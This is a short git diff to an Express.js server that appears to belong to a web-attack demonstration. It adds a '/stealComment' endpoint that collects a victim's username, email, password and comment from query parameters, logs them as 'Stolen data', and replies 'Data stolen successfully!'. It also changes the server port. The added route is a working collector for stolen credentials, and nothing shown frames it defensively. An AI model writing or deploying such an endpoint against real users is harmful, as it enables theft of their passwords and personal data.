@@ -82,6 +82,25 @@ app.get('/victim', (req, res) => {
     res.json(victimData);
 });
 
+// Handle comment stealing
+app.get('/stealComment', (req, res) => {
+  const { username, comment } = req.query;
+
+  const email = req.query.email;
+  const password = req.query.password;
+
+  // Log the stolen data to the console (This would be the hacker's data collection process)
+  console.log(`Stolen data:
+    Username: ${username}
+    Email: ${email}
+    Password: ${password}
+    Comment: ${comment}
+  `);
+
+  // Respond to the client (the attacker)
+  res.send('Data stolen successfully!');
+});
+
 // Update User Route 
 app.post('/update-user', (req, res) => {
   const { newUsername, newPassword } = req.body;
@@ -109,7 +128,7 @@ app.post('/update-user', (req, res) => {
   });
 });
 
-const PORT = process.env.PORT || 3001;
+const PORT = process.env.PORT || 4000;
 app.listen(PORT, () => {
   console.log(`Server running on http://localhost:${PORT}`);
 });
